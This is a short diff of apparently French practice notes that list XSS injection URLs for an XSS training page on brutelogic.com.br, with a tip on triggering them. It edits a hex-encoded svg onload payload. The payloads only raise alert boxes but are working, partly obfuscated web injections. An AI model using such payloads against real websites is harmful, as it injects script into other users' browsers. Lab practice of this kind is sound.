@@ -46,7 +46,8 @@ voilà des injections qui marchent:
 https://brutelogic.com.br/gym.php?p21=javascript://c?%250D%250A%27%3Csvg/onmouseover=alert(2)%3E%27
 (note: il faut cliquer sur le logo "KNOSS" qui clignote et passer le curseur sur l'espace blanc renvoyé=onmouseover)
 
-https://brutelogic.com.br/gym.php?p21=javascript://c?%250D%250A'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e'
+https://brutelogic.com.br/gym.php?p21=javascript://c?%250D%250A%27\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e%27
+  
   
  
   
